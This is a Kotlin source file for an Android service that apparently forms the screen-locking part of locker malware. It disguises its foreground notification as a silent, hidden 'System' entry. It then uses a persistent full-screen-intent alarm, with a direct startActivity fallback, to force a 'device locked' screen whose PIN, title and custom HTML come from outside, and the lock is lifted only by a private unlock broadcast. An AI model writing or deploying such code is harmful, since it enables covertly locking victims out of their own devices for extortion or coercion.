package com.sync.xxx

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat

class LockOverlayService : Service() {

    companion object {
        const val EXTRA_PIN         = "pin"
        const val EXTRA_TITLE       = "title"
        const val EXTRA_CUSTOM_HTML = "custom_html"
        const val EXTRA_LOCK_TYPE   = "lock_type"
        const val LOCK_TYPE_NORMAL  = "normal"
        const val LOCK_TYPE_CUSTOM  = "custom"
        const val LOCK_TYPE_V3      = "v3"
        private const val NOTIF_CHANNEL     = "lock_overlay_channel"
        private const val NOTIF_CHANNEL_FSI = "lock_fsi_channel"
        private const val NOTIF_ID          = 9901
        private const val NOTIF_FSI_ID      = 9902
    }

    private var correctPin: String = ""
    private var lockTitle: String  = "Perangkat Terkunci"
    private var customHtml: String = ""
    private var lockType: String   = LOCK_TYPE_NORMAL
    private var isReceiverRegistered = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                cancelFsiNotif()
                stopSelf()
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannels()
        startForeground(NOTIF_ID, buildSilentNotif())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        correctPin = intent?.getStringExtra(EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(EXTRA_CUSTOM_HTML) ?: ""
        lockType   = intent?.getStringExtra(EXTRA_LOCK_TYPE)   ?: LOCK_TYPE_NORMAL

        registerUnlockReceiver()
        fireFsiNotification()   // ← INI yang launch activity

        return START_STICKY
    }

    // ── Full-screen intent: satu-satunya cara legal launch activity dari service ──
    private fun fireFsiNotification() {
        val activityClass = when (lockType) {
            LOCK_TYPE_V3 -> LockChatActivity::class.java
            else         -> LockNewActivity::class.java
        }

        val activityIntent = Intent(this, activityClass).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            putExtra(EXTRA_PIN,         correctPin)
            putExtra(EXTRA_TITLE,       lockTitle)
            putExtra(EXTRA_CUSTOM_HTML, customHtml)
        }

        val pi = PendingIntent.getActivity(
            this, 0, activityIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val notif = NotificationCompat.Builder(this, NOTIF_CHANNEL_FSI)
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setContentTitle(lockTitle)
            .setContentText("Perangkat terkunci")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setCategory(NotificationCompat.CATEGORY_ALARM)
            .setFullScreenIntent(pi, true)   // ← kunci utama
            .setOngoing(true)
            .setAutoCancel(false)
            .build()

        try {
            NotificationManagerCompat.from(this).notify(NOTIF_FSI_ID, notif)
        } catch (_: SecurityException) {
            // fallback kalau notif permission di-deny: direct startActivity
            try { startActivity(activityIntent) } catch (_: Exception) {}
        }
    }

    private fun cancelFsiNotif() {
        try {
            NotificationManagerCompat.from(this).cancel(NOTIF_FSI_ID)
        } catch (_: Exception) {}
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockOverlayService", "registerReceiver: ${e.message}")
        }
    }

    private fun createChannels() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager

        // Channel silent buat foreground service
        nm.createNotificationChannel(
            NotificationChannel(NOTIF_CHANNEL, "Lock Service", NotificationManager.IMPORTANCE_LOW)
                .apply { setSound(null, null) }
        )

        // Channel HIGH importance buat full-screen intent — wajib IMPORTANCE_HIGH
        nm.createNotificationChannel(
            NotificationChannel(NOTIF_CHANNEL_FSI, "Lock Alert", NotificationManager.IMPORTANCE_HIGH)
                .apply {
                    setSound(null, null)
                    enableLights(false)
                    enableVibration(false)
                }
        )
    }

    private fun buildSilentNotif(): android.app.Notification =
        NotificationCompat.Builder(this, NOTIF_CHANNEL)
            .setContentTitle("System")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .build()

    override fun onDestroy() {
        super.onDestroy()
        cancelFsiNotif()
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
    }
}